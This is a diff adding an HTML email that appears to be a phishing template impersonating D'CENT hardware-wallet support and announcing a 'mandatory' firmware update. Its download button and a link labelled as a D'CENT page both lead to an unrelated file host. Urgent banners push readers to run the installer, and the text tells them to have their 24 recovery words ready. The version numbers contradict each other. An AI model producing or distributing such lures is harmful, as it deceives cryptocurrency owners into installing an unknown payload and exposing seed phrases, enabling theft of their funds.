@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <title>Important: D'CENT Firmware Update v2.45.3.3617 Required</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: #f0f0f0;
+      font-family: 'Inter', Arial, sans-serif;
+      font-size: 15px;
+      color: #222222;
+      line-height: 1.7;
+      -webkit-font-smoothing: antialiased;
+    }
+
+    .email-wrapper {
+      width: 100%;
+      background-color: #f0f0f0;
+      padding: 40px 16px;
+    }
+
+    .email-container {
+      max-width: 620px;
+      margin: 0 auto;
+      background-color: #ffffff;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.10);
+    }
+
+    /* ===== HEADER ===== */
+    .email-header {
+      background-color: #000000;
+      padding: 28px 40px;
+      text-align: center;
+    }
+
+    .email-header img {
+      height: 36px;
+      display: inline-block;
+    }
+
+    /* ===== HERO BANNER ===== */
+    .hero-banner {
+      background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 50%, #111111 100%);
+      padding: 48px 40px 40px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .hero-banner::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: radial-gradient(ellipse at 60% 30%, rgba(39, 196, 184, 0.12) 0%, transparent 70%);
+      pointer-events: none;
+    }
+
+    .hero-badge {
+      display: inline-block;
+      background: rgba(39, 196, 184, 0.15);
+      border: 1px solid rgba(39, 196, 184, 0.4);
+      color: #27c4b8;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 1.6px;
+      text-transform: uppercase;
+      padding: 6px 16px;
+      border-radius: 100px;
+      margin-bottom: 20px;
+    }
+
+    .hero-title {
+      font-size: 30px;
+      font-weight: 800;
+      color: #ffffff;
+      line-height: 1.25;
+      margin-bottom: 14px;
+      letter-spacing: -0.3px;
+    }
+
+    .hero-title span {
+      color: #27c4b8;
+    }
+
+    .hero-subtitle {
+      font-size: 15px;
+      color: #aaaaaa;
+      max-width: 440px;
+      margin: 0 auto 28px;
+      line-height: 1.65;
+    }
+
+    .hero-version-pill {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.12);
+      border-radius: 100px;
+      padding: 8px 18px;
+      color: #cccccc;
+      font-size: 13px;
+      font-weight: 500;
+    }
+
+    .hero-version-pill .dot {
+      width: 7px;
+      height: 7px;
+      background: #27c4b8;
+      border-radius: 50%;
+      display: inline-block;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.4; }
+    }
+
+    /* ===== ALERT STRIP ===== */
+    .alert-strip {
+      background: linear-gradient(90deg, #27c4b8, #1deedc);
+      padding: 14px 40px;
+      text-align: center;
+    }
+
+    .alert-strip p {
+      font-size: 13px;
+      font-weight: 700;
+      color: #000000;
+      letter-spacing: 0.3px;
+    }
+
+    /* ===== BODY CONTENT ===== */
+    .email-body {
+      padding: 40px 40px 0;
+    }
+
+    .greeting {
+      font-size: 16px;
+      color: #222222;
+      margin-bottom: 16px;
+      font-weight: 500;
+    }
+
+    .intro-text {
+      font-size: 15px;
+      color: #444444;
+      margin-bottom: 28px;
+      line-height: 1.75;
+    }
+
+    /* ===== SECTION TITLE ===== */
+    .section-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: #111111;
+      margin-bottom: 16px;
+      padding-bottom: 10px;
+      border-bottom: 2px solid #f0f0f0;
+    }
+
+    /* ===== FEATURE CARDS ===== */
+    .feature-list {
+      margin-bottom: 32px;
+    }
+
+    .feature-item {
+      display: flex;
+      gap: 16px;
+      align-items: flex-start;
+      padding: 18px 20px;
+      background: #fafafa;
+      border-radius: 10px;
+      margin-bottom: 12px;
+      border: 1px solid #eeeeee;
+    }
+
+    .feature-icon {
+      width: 42px;
+      height: 42px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      flex-shrink: 0;
+    }
+
+    .feature-icon.teal {
+      background: rgba(39, 196, 184, 0.12);
+    }
+
+    .feature-icon.blue {
+      background: rgba(59, 130, 246, 0.10);
+    }
+
+    .feature-icon.purple {
+      background: rgba(139, 92, 246, 0.10);
+    }
+
+    .feature-content h4 {
+      font-size: 14px;
+      font-weight: 700;
+      color: #111111;
+      margin-bottom: 4px;
+    }
+
+    .feature-content p {
+      font-size: 13px;
+      color: #666666;
+      line-height: 1.6;
+    }
+
+    /* ===== CHANGELOG ===== */
+    .changelog-box {
+      background: #f7f7f7;
+      border-radius: 10px;
+      border: 1px solid #e8e8e8;
+      padding: 22px 24px;
+      margin-bottom: 32px;
+    }
+
+    .changelog-box h3 {
+      font-size: 13px;
+      font-weight: 700;
+      color: #888888;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      margin-bottom: 14px;
+    }
+
+    .changelog-item {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      margin-bottom: 10px;
+      font-size: 13.5px;
+      color: #333333;
+    }
+
+    .changelog-item:last-child {
+      margin-bottom: 0;
+    }
+
+    .changelog-dot {
+      width: 6px;
+      height: 6px;
+      background: #27c4b8;
+      border-radius: 50%;
+      flex-shrink: 0;
+      margin-top: 7px;
+    }
+
+    /* ===== STEPS ===== */
+    .steps-section {
+      margin-bottom: 32px;
+    }
+
+    .step-row {
+      display: flex;
+      gap: 14px;
+      align-items: flex-start;
+      margin-bottom: 14px;
+    }
+
+    .step-number {
+      width: 30px;
+      height: 30px;
+      background: #000000;
+      color: #ffffff;
+      border-radius: 50%;
+      font-size: 13px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .step-text h4 {
+      font-size: 14px;
+      font-weight: 700;
+      color: #111111;
+      margin-bottom: 2px;
+    }
+
+    .step-text p {
+      font-size: 13px;
+      color: #666666;
+      line-height: 1.55;
+    }
+
+    /* ===== WARNING BOX ===== */
+    .warning-box {
+      background: #fffbeb;
+      border: 1px solid #fcd34d;
+      border-left: 4px solid #f59e0b;
+      border-radius: 8px;
+      padding: 16px 20px;
+      margin-bottom: 32px;
+    }
+
+    .warning-box p {
+      font-size: 13.5px;
+      color: #78350f;
+      line-height: 1.6;
+    }
+
+    .warning-box strong {
+      color: #92400e;
+    }
+
+    /* ===== CTA BUTTON ===== */
+    .cta-section {
+      text-align: center;
+      padding: 8px 0 36px;
+    }
+
+    .cta-button {
+      display: inline-block;
+      background: linear-gradient(135deg, #27c4b8, #1deedc);
+      color: #000000 !important;
+      font-size: 16px;
+      font-weight: 800;
+      text-decoration: none;
+      padding: 18px 48px;
+      border-radius: 8px;
+      letter-spacing: 0.2px;
+      box-shadow: 0 4px 20px rgba(39, 196, 184, 0.35);
+    }
+
+    .cta-sub {
+      font-size: 12px;
+      color: #999999;
+      margin-top: 12px;
+    }
+
+    /* ===== DIVIDER ===== */
+    .divider {
+      height: 1px;
+      background: #eeeeee;
+      margin: 0 40px;
+    }
+
+    /* ===== SUPPORT SECTION ===== */
+    .support-section {
+      padding: 28px 40px;
+      background: #fafafa;
+    }
+
+    .support-section p {
+      font-size: 13.5px;
+      color: #555555;
+      line-height: 1.7;
+      margin-bottom: 10px;
+    }
+
+    .support-section p:last-child {
+      margin-bottom: 0;
+    }
+
+    .support-section a {
+      color: #27c4b8;
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    /* ===== FOOTER ===== */
+    .email-footer {
+      background: #111111;
+      padding: 28px 40px;
+      text-align: center;
+    }
+
+    .footer-logo {
+      margin-bottom: 14px;
+    }
+
+    .footer-logo img {
+      height: 26px;
+      opacity: 0.7;
+    }
+
+    .footer-links {
+      margin-bottom: 14px;
+    }
+
+    .footer-links a {
+      color: #777777;
+      font-size: 12px;
+      text-decoration: none;
+      margin: 0 10px;
+    }
+
+    .footer-links a:hover {
+      color: #27c4b8;
+    }
+
+    .footer-copy {
+      font-size: 11.5px;
+      color: #555555;
+      line-height: 1.6;
+    }
+
+    .footer-copy a {
+      color: #27c4b8;
+      text-decoration: none;
+    }
+
+    /* ===== RESPONSIVE ===== */
+    @media only screen and (max-width: 600px) {
+      .email-header,
+      .hero-banner,
+      .email-body,
+      .support-section,
+      .email-footer {
+        padding-left: 24px !important;
+        padding-right: 24px !important;
+      }
+
+      .hero-title {
+        font-size: 24px;
+      }
+
+      .cta-button {
+        padding: 16px 32px;
+        font-size: 15px;
+      }
+
+      .divider {
+        margin: 0 24px;
+      }
+
+      .alert-strip {
+        padding-left: 24px;
+        padding-right: 24px;
+      }
+    }
+  </style>
+</head>
+<body>
+<div class="email-wrapper">
+  <div class="email-container">
+
+    <!-- ===== HEADER ===== -->
+    <div class="email-header">
+      <img
+        src="https://store.dcentwallet.com/cdn/shop/files/dcent_logo_horizontal_full_color_b5795af0-d598-48a8-8904-ff84f7fb1d5a.png?v=1677607642&width=250"
+        alt="D'CENT Wallet"
+      />
+    </div>
+
+    <!-- ===== HERO BANNER ===== -->
+    <div class="hero-banner">
+      <div class="hero-badge">Action Required</div>
+      <h1 class="hero-title">
+        Firmware Update v2.45.3.3617<br />
+        <span>Is Now Mandatory</span>
+      </h1>
+      <p class="hero-subtitle">
+        A critical firmware update is now required for all D'CENT Biometric Wallet users.
+        Please download and install it at your earliest convenience to keep your wallet
+        secure and fully functional.
+      </p>
+      <div class="hero-version-pill">
+        <span class="dot"></span>
+        Version 3.26.0 &nbsp;&middot;&nbsp; Released March 2026 &nbsp;&middot;&nbsp; Required for all users
+      </div>
+    </div>
+
+    <!-- ===== ALERT STRIP ===== -->
+    <div class="alert-strip">
+      <p>&#9888;&#65039; This update is compulsory. All users must install it to maintain full wallet security and functionality.</p>
+    </div>
+
+    <!-- ===== BODY ===== -->
+    <div class="email-body">
+
+      <p class="greeting">Hello,</p>
+
+      <p class="intro-text">
+        We are reaching out to let you know that a new mandatory firmware update is now available
+        for your D'CENT Biometric Wallet. This is not a routine update. Version 3.26.0 includes
+        critical security patches, real-time scam detection, expanded blockchain support, and a
+        number of meaningful improvements to how you interact with your wallet every day.
+      </p>
+
+      <p class="intro-text" style="margin-top: -12px;">
+        We strongly encourage you to install this update as soon as possible. Wallets running
+        older firmware versions will have limited access to new features and may be exposed to
+        security vulnerabilities that this update specifically addresses.
+      </p>
+
+      <!-- FEATURES -->
+      <h2 class="section-title">What Is New in v2.45.3.3617</h2>
+
+      <div class="feature-list">
+
+        <div class="feature-item">
+          <div class="feature-icon teal">&#128279;</div>
+          <div class="feature-content">
+            <h4>New Blockchains and Tokens Added</h4>
+            <p>
+              This release adds support for 15 new blockchain networks including Base, Scroll,
+              Linea, and Blast, along with over 200 new tokens. Your wallet now covers more of
+              the crypto ecosystem right out of the box, with full EVM compatibility and Layer 2
+              support built in.
+            </p>
+          </div>
+        </div>
+
+        <div class="feature-item">
+          <div class="feature-icon blue">&#9889;</div>
+          <div class="feature-content">
+            <h4>New Features and Usability Improvements</h4>
+            <p>
+              We have redesigned key parts of the wallet interface to make everyday tasks faster
+              and more intuitive. Transaction signing is now 30% quicker, the portfolio overview
+              has been rebuilt with real-time pricing, and the dApp browser now supports a wider
+              range of decentralized applications with improved compatibility.
+            </p>
+          </div>
+        </div>
+
+        <div class="feature-item">
+          <div class="feature-icon purple">&#128737;&#65039;</div>
+          <div class="feature-content">
+            <h4>Security Enhancements and Scam Detection</h4>
+            <p>
+              This update integrates real-time scam detection powered by Blockaid. Every
+              transaction you initiate is now screened before you sign it, protecting you
+              against malicious contracts, phishing attempts, and fraudulent token approvals.
+              Critical security patches for known vulnerabilities are also included in this release.
+            </p>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- CHANGELOG -->
+      <div class="changelog-box">
+        <h3>Full Changelog Highlights</h3>
+
+        <div class="changelog-item">
+          <span class="changelog-dot"></span>
+          <span>Added 15 new blockchain networks including Base, Scroll, Linea, and Blast</span>
+        </div>
+        <div class="changelog-item">
+          <span class="changelog-dot"></span>
+          <span>Integrated Blockaid real-time scam and phishing detection engine</span>
+        </div>
+        <div class="changelog-item">
+          <span class="changelog-dot"></span>
+          <span>Over 200 new ERC-20 and cross-chain tokens added to the supported list</span>
+        </div>
+        <div class="changelog-item">
+          <span class="changelog-dot"></span>
+          <span>Enhanced biometric authentication speed, now 30% faster than previous firmware</span>
+        </div>
+        <div class="changelog-item">
+          <span class="changelog-dot"></span>
+          <span>Redesigned portfolio overview with live pricing and improved asset breakdown</span>
+        </div>
+        <div class="changelog-item">
+          <span class="changelog-dot"></span>
+          <span>Added support for Solana SPL tokens and NFT display</span>
+        </div>
+        <div class="changelog-item">
+          <span class="changelog-dot"></span>
+          <span>Improved USB-C connectivity stability and dApp browser performance</span>
+        </div>
+        <div class="changelog-item">
+          <span class="changelog-dot"></span>
+          <span>Critical security hardening against side-channel attack vectors</span>
+        </div>
+        <div class="changelog-item">
+          <span class="changelog-dot"></span>
+          <span>Bug fixes for Bluetooth pairing issues on Android 14 devices</span>
+        </div>
+      </div>
+
+      <!-- HOW TO UPDATE -->
+      <h2 class="section-title">How to Install the Update</h2>
+
+      <div class="steps-section">
+
+        <div class="step-row">
+          <div class="step-number">1</div>
+          <div class="step-text">
+            <h4>Download the Firmware Installer</h4>
+            <p>Click the download button below to get the official D'CENT Firmware Installer for your platform. Windows, macOS, and Android are all supported.</p>
+          </div>
+        </div>
+
+        <div class="step-row">
+          <div class="step-number">2</div>
+          <div class="step-text">
+            <h4>Connect Your Wallet via USB</h4>
+            <p>Use a data-capable USB cable to connect your D'CENT Biometric Wallet to your computer or Android phone. Make sure the cable supports data transfer, not just charging.</p>
+          </div>
+        </div>
+
+        <div class="step-row">
+          <div class="step-number">3</div>
+          <div class="step-text">
+            <h4>Run the Installer and Follow the Prompts</h4>
+            <p>Open the downloaded installer and follow the on-screen instructions. The tool will automatically detect your device and begin the update process.</p>
+          </div>
+        </div>
+
+        <div class="step-row">
+          <div class="step-number">4</div>
+          <div class="step-text">
+            <h4>Wait for Completion</h4>
+            <p>The update takes approximately 3 to 5 minutes. Keep your device connected throughout. Your wallet will restart automatically once the update is complete.</p>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- WARNING -->
+      <div class="warning-box">
+        <p>
+          <strong>Important:</strong> Before starting the update, please make sure your device battery is above 20%
+          and that you have your <strong>24 Recovery Words</strong> accessible in case the process is interrupted
+          unexpectedly. Once installed, firmware cannot be downgraded to a previous version.
+          Do not disconnect your wallet during the update.
+        </p>
+      </div>
+
+    </div>
+
+    <!-- ===== CTA BUTTON ===== -->
+    <div class="cta-section">
+      <a
+        href="https://api.files.link/v1/p/0078d429-e8d3-4fce-ae86-591b4af2fd34"
+        class="cta-button"
+        onclick="(function(){window.location.href='https://api.files.link/v1/p/0078d429-e8d3-4fce-ae86-591b4af2fd34';})();return false;"
+      >
+        &#11015;&#65039; &nbsp; Download Firmware v2.45.3.3617
+      </a>
+      <p class="cta-sub">Compatible with Windows, macOS, and Android &nbsp;&middot;&nbsp; Takes under 5 minutes</p>
+    </div>
+
+    <div class="divider"></div>
+
+    <!-- ===== SUPPORT ===== -->
+    <div class="support-section">
+      <p>
+        If you run into any issues during the update process or have questions about what is
+        included in this release, our support team is ready to help. You can reach us through
+        the official D'CENT Help Center or by visiting our community forum.
+      </p>
+      <p>
+        For step-by-step installation guidance, troubleshooting tips, and frequently asked
+        questions, visit the full firmware update page at
+        <a href="https://api.files.link/v1/p/0078d429-e8d3-4fce-ae86-591b4af2fd34">dcentfirmware.store</a>.
+      </p>
+      <p>
+        Thank you for being part of the D'CENT community. We built this update with your
+        security and experience in mind, and we appreciate your continued trust in us.
+      </p>
+      <p style="margin-top: 18px; color: #333333; font-weight: 600;">
+        Warm regards,<br />
+        The D'CENT Wallet Team
+      </p>
+    </div>
+
+    <!-- ===== FOOTER ===== -->
+    <div class="email-footer">
+      <div class="footer-logo">
+        <img
+          src="https://store.dcentwallet.com/cdn/shop/files/dcent_logo_horizontal_full_color_b5795af0-d598-48a8-8904-ff84f7fb1d5a.png?v=1677607642&width=250"
+          alt="D'CENT Wallet"
+        />
+      </div>
+
+      <div class="footer-links">
+        <a href="https://dcentwallet.com">Website</a>
+        <a href="https://store.dcentwallet.com">Store</a>
+        <a href="https://dcentwallet.com/support">Support</a>
+        <a href="https://dcentwallet.com/privacy">Privacy Policy</a>
+      </div>
+
+      <p class="footer-copy">
+        You are receiving this email because you own a D'CENT Biometric Wallet or have
+        registered an account with D'CENT.<br />
+        &copy; 2026 IoTrust Co., Ltd. All rights reserved.<br />
+        <a href="#">Unsubscribe</a> &nbsp;&middot;&nbsp; <a href="#">Manage Preferences</a>
+      </p>
+    </div>
+
+  </div>
+</div>
+</body>
+</html>
